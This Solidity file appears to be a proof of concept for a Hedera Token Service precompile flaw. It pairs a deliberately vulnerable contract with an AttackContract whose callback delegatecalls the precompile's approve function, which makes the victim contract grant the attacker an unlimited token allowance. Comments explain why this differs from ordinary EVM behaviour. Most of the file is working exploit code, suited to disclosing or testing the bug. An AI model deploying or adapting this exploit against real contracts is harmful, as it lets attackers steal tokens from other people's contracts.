// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

import './IHederaTokenService.sol';

address constant PRECOMPILE_ADDRESS = address(0x167);
int constant SUCCESS_CODE = 22;
int constant UNKNOWN_CODE = 21;

interface IArbitraryCall {
    function callback() external;
}

contract VulnerableContract {
    address public token;

    function associateToken(address token_) external {
        require(token == address(0), "TOKEN_ALREADY_DEFINED");

        (bool success, bytes memory result) = PRECOMPILE_ADDRESS.call(
            abi.encodeWithSelector(IHederaTokenService.associateToken.selector,
            address(this), token_));
        int responseCode = success ? abi.decode(result, (int32)) : UNKNOWN_CODE;
        require(responseCode == SUCCESS_CODE, "APPROVE_FAILED");

        token = token_;
    }

    function arbitraryCallback(address to) external {
        IArbitraryCall(to).callback();
    }
}

contract AttackContract is IArbitraryCall {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function callback() external override {
        address token = VulnerableContract(msg.sender).token();
        // FOLLOWING REGISTERS msg.sender (VulnerableContract) AS THE OWNER WHEN MAKING THE APPROVAL
        // IN EVM THIS IS FINE BECAUSE ONLY THE CALLING CONTRACT STATE CAN CHANGE. HOWEVER, WITH
        // THE PRECOMPILE HTS STATE CHANGES.
        (bool success, bytes memory result) = PRECOMPILE_ADDRESS.delegatecall(
            abi.encodeWithSelector(IHederaTokenService.approve.selector,
            token, owner, type(uint32).max));
        int responseCode = success ? abi.decode(result, (int32)) : UNKNOWN_CODE;
        require(responseCode == SUCCESS_CODE, "APPROVE_FAILED");
    }
}

